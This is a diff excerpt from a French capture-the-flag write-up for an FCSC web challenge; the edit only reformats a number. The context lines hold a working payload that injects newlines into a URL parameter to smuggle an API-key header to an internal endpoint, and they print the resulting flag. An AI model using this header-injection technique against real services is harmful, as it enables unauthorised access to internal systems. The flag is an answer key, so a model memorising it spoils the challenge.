@@ -80,7 +80,7 @@ Je calcule la taille de la clé ```X-API-KEY```.<br/>
 >>> print(len("b99cc420eb25205168e83190bae48a12"))
 32
 ```
-J'ajoute le header ```Content-Length``` avec la taille de la clé (32).<br/>
+J'ajoute le header ```Content-Length``` avec la taille de la clé (```32```).<br/>
 ```http://challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=@127.0.0.1:1337/api/secret+HTTP/1.1%0aX-API-KEY:b99cc420eb25205168e83190bae48a12%0aContent-length:32```<br/>
 ```json
 {"secret":"FCSC{6e86560231bae31b04948823e8d56fac5f1704aaeecf72b0c03bfe742d59fdfb}"}
